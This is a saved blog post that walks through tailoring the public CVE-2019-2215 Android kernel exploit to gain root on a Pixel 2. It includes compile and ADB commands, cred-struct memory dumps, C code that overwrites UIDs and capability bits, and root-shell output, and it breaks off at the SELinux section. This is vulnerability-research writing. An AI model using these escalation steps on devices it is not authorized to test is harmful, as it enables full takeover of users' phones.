<!DOCTYPE html>
<!-- saved from url=(0063)https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/ -->
<html lang="en" data-theme="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://hernan.de/favicon.ico?v=1.1">
  <meta name="theme-color" content="#2e82f1">
  <link rel="icon" sizes="128x128" href="https://hernan.de/logo.png?v=1">

  <title>Grant H. - Tailoring CVE-2019-2215 to Achieve Root</title>
  <meta name="description" content="When I heard about the emergency disclosure of CVE-2019-2215 by Project Zero, I decided to replicate the exploit on my local device to see it in action. I so...">

  <link rel="stylesheet" href="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/bootstrap.min.css">
  <link rel="stylesheet" href="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/main.css">
  <link href="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/css" rel="stylesheet" type="text/css">

  <!-- https://developers.google.com/speed/docs/insights/OptimizeCSSDelivery -->
  
  <script async="" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/analytics.js.下載"></script><script>
    var loadDeferredStyles = function() {
      var addStylesNode = document.getElementById("deferred-styles");
      var replacement = document.createElement("div");
      replacement.innerHTML = addStylesNode.textContent;
      document.body.appendChild(replacement);
      addStylesNode.parentElement.removeChild(addStylesNode);
    };
    var raf = window.requestAnimationFrame || window.mozRequestAnimationFrame ||
	window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
    if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
    else window.addEventListener('load', loadDeferredStyles);
  </script>
  <link rel="canonical" href="https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/">
  <link rel="alternate" type="application/rss+xml" title="Grant Hernandez" href="https://hernan.de/feed.xml">
<style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_About.MathJax_MousePost {outline: none}
.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
.MathJax_MenuItem {padding: 2px 2em; background: transparent}
.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
.MathJax_MenuActive .MathJax_MenuArrow {color: white}
.MathJax_MenuArrow.RTL {left: .5em; right: auto}
.MathJax_MenuCheck {position: absolute; left: .7em}
.MathJax_MenuCheck.RTL {right: .7em; left: auto}
.MathJax_MenuRadioCheck {position: absolute; left: 1em}
.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
.MathJax_MenuDisabled {color: GrayText}
.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
.MathJax_ContextMenu:focus {outline: none}
.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
#MathJax_AboutClose {top: .2em; right: .2em}
.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_MenuClose:hover span {background-color: #CCC!important}
.MathJax_MenuClose:hover:focus {outline: none}
</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
</style><style type="text/css">.MathJax_Preview {color: #888}
#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
.MathJax_Error {color: #CC0000; font-style: italic}
</style><script charset="utf-8" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/horizon_tweet.4027cff8c5dfbbf9b414b0df963e6b7d.js.下載"></script><style type="text/css">.MJXp-script {font-size: .8em}
.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
.MJXp-bold {font-weight: bold}
.MJXp-italic {font-style: italic}
.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-largeop {font-size: 150%}
.MJXp-largeop.MJXp-int {vertical-align: -.2em}
.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
.MJXp-display {display: block; text-align: center; margin: 1em 0}
.MJXp-math span {display: inline-block}
.MJXp-box {display: block!important; text-align: center}
.MJXp-box:after {content: " "}
.MJXp-rule {display: block!important; margin-top: .1em}
.MJXp-char {display: block!important}
.MJXp-mo {margin: 0 .15em}
.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
.MJXp-denom {display: inline-table!important; width: 100%}
.MJXp-denom > * {display: table-row!important}
.MJXp-surd {vertical-align: top}
.MJXp-surd > * {display: block!important}
.MJXp-script-box > *  {display: table!important; height: 50%}
.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
.MJXp-script-box > *:last-child > * {vertical-align: bottom}
.MJXp-script-box > * > * > * {display: block!important}
.MJXp-mphantom {visibility: hidden}
.MJXp-munderover, .MJXp-munder {display: inline-table!important}
.MJXp-over {display: inline-block!important; text-align: center}
.MJXp-over > * {display: block!important}
.MJXp-munderover > *, .MJXp-munder > * {display: table-row!important}
.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
.MJXp-mtr {display: table-row!important}
.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-mlabeledtr {display: table-row!important}
.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
</style></head>


  <body><div id="MathJax_Message" style="display: none;"></div>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="https://hernan.de/">Grant Hernandez</a>

    <nav class="site-nav">
      <i href="#" class="menu-icon fa fa-bars"></i>

      <div class="trigger row">
        <a class="my-page-link col" href="https://hernan.de/">Home</a>
        <a class="my-page-link col" href="https://hernan.de/research/">Research</a>
        <a class="my-page-link col" href="https://hernan.de/research/vita/">CV</a>
        <a class="my-page-link col" href="https://hernan.de/blog/">Blog</a>
        <a class="my-page-link col" href="https://hernan.de/projects/">Projects</a>
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="post">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@digital_cold">
  <meta name="twitter:creator" content="@digital_cold">
  <meta name="twitter:title" content="Tailoring CVE-2019-2215 to Achieve Root">
  <meta name="twitter:description" content="When I heard about the emergency disclosure of CVE-2019-2215 by Project Zero, I decided to replicate the exploit on my local device to see it in action. I so...">
  
  <meta name="twitter:image" content="https://hernan.de/assets/posts/tailoring-cve-2019-2215-to-achieve-root/image_preview.png">
  

  <header class="post-header">
    <h1 class="post-title">Tailoring CVE-2019-2215 to Achieve Root</h1>
    <p class="post-meta"><time datetime="2019-10-15T00:00:00-04:00">Oct 15, 2019</time> • By Grant • <i class="fa fa-list pr-1"></i>

    
    <a href="https://hernan.de/blog/categories#Vulnerability%20Research">Vulnerability Research</a>
    
    </p>

  
  
  
  <div class="text-center">
    <img class="preview-image" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/image_preview.png" alt="Tailoring CVE-2019-2215 to Achieve Root">
  </div>
  
  
  </header>

  <article class="post-content">
    
    <p>When I heard about the emergency <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">disclosure of CVE-2019-2215 by Project Zero</a>, I decided to replicate the exploit on my local device to see it in action. I so happened to have a vulnerable Pixel 2 with the exact kernel version as my main device (don’t hack me). All I needed to do was compile the exploit and run it over ADB. I downloaded the latest <a href="https://developer.android.com/ndk/downloads">Android NDK</a> and compiled the proof of concept:</p>

<div class="highlight"><pre><code>[grant ~/Downloads/android-ndk-r20 &gt;&gt; ./toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang -o poc ../poc.c
[grant ~/Downloads/android-ndk-r20 &gt;&gt; adb push poc /data/local/tmp/poc
poc: 1 file pushed. 0.8 MB/s (22528 bytes in 0.026s)
</code></pre></div>

<p>I ran it on my device and confirmed that I was able to reproduce <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=414886&amp;signed_aid=W6S1GtTOG9xXGjwwVa_5hw==&amp;inline=1">Maddie Stone’s screenshot</a> exactly.</p>

<p>The base PoC left us with a full kernel read/write primitive, essentially game over for the systems’ security, but left achieving root as an exercise for the reader.
This raises the question, what does “root” really mean for a modern Android system? To answer this, we must first understand how Android enforces its security policies.</p>

<!--preview-->

<p>Android protects against malicious applications through a layered enforcement approach. Here are the major players:</p>

<p class="center"><img alt="Android Security Hierarchy" class="float-none float-md-left mr-3 mb-2" width="250" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/security-hierarchy.png"></p>

<ul class="flowing-list">
  <li><strong>Discretionary Access Control (DAC)</strong> - UNIX permissions (user/group IDs, R/W/X object permissions</li>
  <li><strong>Mandatory Access Control (MAC)</strong> - Type enforcement through SELinux/SEAndroid (effectively a whitelist of who can talk to who and how)</li>
  <li><strong>Linux Capabilities (CAP)</strong> - Breaks up the all-powerful root user into permission slices (<code>CAP_XYZ</code>)</li>
  <li><strong>SECCOMP</strong> - Allows system calls to be filtered/blocked, effectively limiting the kernel attack surface</li>
  <li><strong>Android Middleware</strong> - Typical Android app permissions as defined in <code>android_manifest.xml</code> such as <code>android.permission.INTERNET</code> (usually enforced by <code>system_server</code>)</li>
</ul>

<p class="clearfix">To get a full root shell we’d need to bypass each layer of enforcement (with the exception of the Android middleware as the exploit targets binder, which doesn’t require any middleware checks to access). On a modern Android system, this is a significant undertaking without a kernel vulnerability.
But with an app accessible kernel exploit, we have the ability to bypass or disable all of these with relative ease.
For each task on a system, the Linux kernel keeps track of its state in the
<code>task_struct</code> structure. This state happens to include security relevant
details such as all of the user IDs, its SELinux context, what capabilities it
has, if SECCOMP is enabled, and many others. If we are able to target a
specific <code>task_struct</code> with our R/W primitive, we will be able to change these
security sensitive values to what we please. For instance, if we target our
<em>own</em> task (the current process), then we can effectively achieve an Escalation
of Privilege (EoP).</p>

<h2 id="escalating-to-root">Escalating to Root</h2>

<h3 id="bypassing-dac-and-cap">Bypassing DAC and CAP</h3>

<p>With a pointer to our current task_struct, all we need is the correct offset from the start to our current process credentials.
We can then read the pointer value and use it in subsequent calls to poke at our credentials.</p>

<p>The <code>cred</code> struct in Linux has all of the goodies we’re looking to change to escalate our current process.
Here is the <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h">source code</a> taken from the latest version of the Linux kernel.</p>

<div class="highlight"><pre><code class="language-c"><span class="k">struct</span> <span class="nc">cred</span> <span class="p">{</span>
	<span class="n">atomic_t</span>	<span class="n">usage</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS</span>
	<span class="n">atomic_t</span>	<span class="n">subscribers</span><span class="p">;</span>	<span class="cm">/* number of processes subscribed */</span>
	<span class="kt">void</span>		<span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
	<span class="kt">unsigned</span>	<span class="n">magic</span><span class="p">;</span>
<span class="cp">#define CRED_MAGIC	0x43736564</span>
<span class="cp">#define CRED_MAGIC_DEAD	0x44656144</span>
<span class="cp">#endif</span>
	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we're permitted */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
<span class="cp">#ifdef CONFIG_KEYS</span>
	<span class="kt">unsigned</span> <span class="kt">char</span>	<span class="n">jit_keyring</span><span class="p">;</span>	<span class="cm">/* default keyring to attach requested</span>
<span class="cm">					 * keys to */</span>
	<span class="k">struct</span> <span class="nc">key</span>	<span class="o">*</span><span class="n">session_keyring</span><span class="p">;</span> <span class="cm">/* keyring inherited over fork */</span>
	<span class="k">struct</span> <span class="nc">key</span>	<span class="o">*</span><span class="n">process_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this process */</span>
	<span class="k">struct</span> <span class="nc">key</span>	<span class="o">*</span><span class="n">thread_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this thread */</span>
	<span class="k">struct</span> <span class="nc">key</span>	<span class="o">*</span><span class="n">request_key_auth</span><span class="p">;</span> <span class="cm">/* assumed request_key authority */</span>
<span class="cp">#endif</span>
<span class="cp">#ifdef CONFIG_SECURITY</span>
	<span class="kt">void</span>		<span class="o">*</span><span class="n">security</span><span class="p">;</span>	<span class="cm">/* subjective LSM security */</span>
<span class="cp">#endif</span>
	<span class="k">struct</span> <span class="nc">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>	<span class="cm">/* real user ID subscription */</span>
	<span class="k">struct</span> <span class="nc">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span> <span class="cm">/* user_ns the caps and keyrings are relative to. */</span>
	<span class="k">struct</span> <span class="nc">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>	<span class="cm">/* supplementary groups for euid/fsgid */</span>
	<span class="cm">/* RCU deletion */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">non_rcu</span><span class="p">;</span>			<span class="cm">/* Can we skip RCU deletion? */</span>
		<span class="k">struct</span> <span class="nc">rcu_head</span>	<span class="n">rcu</span><span class="p">;</span>		<span class="cm">/* RCU deletion hook */</span>
	<span class="p">};</span>
<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span></code></pre></div>
<p>There are a lot of fields of varying sizes that we need to change. Before randomly poking what we believe to be the right offsets, lets dump the memory of our credential struct to eyeball it.</p>

<div class="highlight"><pre><code>[grant ~/Downloads/android-ndk-r20 &gt;&gt; adb shell /data/local/tmp/poc shell
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: Finished write to FIFO.
writev() returns 0x2000
PARENT: Finished calling READV
current_ptr == 0xffffffea05065700
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
writev() returns 0x2000
PARENT: Finished calling READV
current_ptr == 0xffffffea05065700
recvmsg() returns 49, expected 49
should have stable kernel R/W now :)
current-&gt;mm == 0xffffffeaafefc100
current-&gt;mm-&gt;user_ns == 0xffffff98848af2c8
kernel base is 0xffffff9882880000
&amp;init_task == 0xffffff98848a57d0
init_task.cred == 0xffffff98848b0b08
init-&gt;cred
00000000  04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000030  ff ff ff ff 3f 00 00 00 ff ff ff ff 3f 00 00 00  |....?.......?...|
00000040  ff ff ff ff 3f 00 00 00 00 00 00 00 00 00 00 00  |....?...........|
00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00 80 d4 42 b9 ea ff ff ff  |..........B.....|
00000080  c8 f3 8a 84 98 ff ff ff c8 f2 8a 84 98 ff ff ff  |................|
00000090  78 0a 8b 84 98 ff ff ff 00 00 00 00 00 00 00 00  |x...............|
current-&gt;cred == 0xffffffeab30a5b40
Starting as uid 2000
current-&gt;cred
00000000  1a 00 00 00 d0 07 00 00 d0 07 00 00 d0 07 00 00  |................|
00000010  d0 07 00 00 d0 07 00 00 d0 07 00 00 d0 07 00 00  |................|
00000020  d0 07 00 00 2f 00 00 00 00 00 00 00 00 00 00 00  |..../...........|
00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000040  c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000050  00 00 00 00 00 00 00 00 c0 b6 9d f2 c3 ff ff ff  |........@..2....|
00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00 00 29 ce 69 c4 ff ff ff  |................|
00000080  00 50 22 74 c4 ff ff ff c8 f2 aa 14 9e ff ff ff  |...1............|
00000090  00 33 fa 9e c3 ff ff ff 00 00 00 00 00 00 00 00  |................|
</code></pre></div>

<p>Looking at the bottom hexdump, we can start to see some patterns.
Our current UID, 2000, in hex is 0x07d0. We can easily see that we definitely have a correct pointer to our task’s credential struct in the manually reformatted hexdump below:</p>

<div class="highlight"><pre><code>~~~ Dump of current-&gt;cred ~~~
OFF | VALUE
 0  | 1a000000 // usage
 4  | d0070000 // uid
 8  | d0070000 // gid
 c  | d0070000 // suid
10  | d0070000 // sgid
14  | d0070000 // euid
18  | d0070000 // egid
1c  | d0070000 // fsuid
20  | d0070000 // fsgid
24  | 2f000000 // securebits
28  | 0000000000000000 // cap inh
30  | 0000000000000000 // cap perm
38  | 0000000000000000 // cap eff
40  | c000000000000000 // cap bound
48  | 0000000000000000 // cap ambient
50  | 0000000000000000 // jit keyring
58  | c0b69df2c3ffffff // session keyring
60  | 0000000000000000 // process keyring
68  | 0000000000000000 // thread keyring
70  | 0000000000000000 // request key auth
78  | 0029ce69c4ffffff // cred-&gt;security
80  | 00502274c4ffffff // user struct
88  | c8f2aa149effffff // user namespace
90  | 0033fa9ec3ffffff // group info
</code></pre></div>
<p>With this map, we can begin to become root, first by setting all of our uid and gids to 0.</p>

<div class="highlight"><pre><code class="language-c"><span class="kt">uid_t</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">my_cred</span> <span class="o">=</span> <span class="n">kernel_read_ulong</span><span class="p">(</span><span class="n">current_ptr</span> <span class="o">+</span> <span class="n">OFFSET__task_struct__cred</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"current-&gt;cred == 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">my_cred</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"Starting as uid %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Escalating...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="c1">// change IDs to root (there are eight)</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="n">kernel_write_uint</span><span class="p">(</span><span class="n">my_cred</span><span class="o">+</span><span class="mi">4</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Something went wrong changing our UID to root!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"UIDs changed to root!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span></code></pre></div>

<p>Executing a shell from this point, demonstrates that we have root…but only the DAC part of it.</p>

<div class="highlight"><pre><code>...
UIDs changed to root!
Spawning shell!
id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
</code></pre></div>

<p>Next, we target capabilities. This involves setting every capability bit to 1 and clearing our <a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/securebits.h">securebits</a> (init doesn’t have these set, so why should we).</p>

<div class="highlight"><pre><code class="language-c"><span class="c1">// reset securebits</span>
<span class="n">kernel_write_uint</span><span class="p">(</span><span class="n">my_cred</span><span class="o">+</span><span class="mh">0x24</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="c1">// change capabilities to everything (perm, effective, bounding)</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="n">kernel_write_ulong</span><span class="p">(</span><span class="n">my_cred</span><span class="o">+</span><span class="mh">0x30</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x3fffffffffUL</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"Capabilities set to ALL</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span></code></pre></div>

<p>Now our process is technically full root from a stock Linux perspective, but Android’s MAC policy still locks our root process to anything that the <code>u:r:shell:s0</code> context can do.</p>

<h3 id="disabling-selinux">Disabling SELinux</h3>

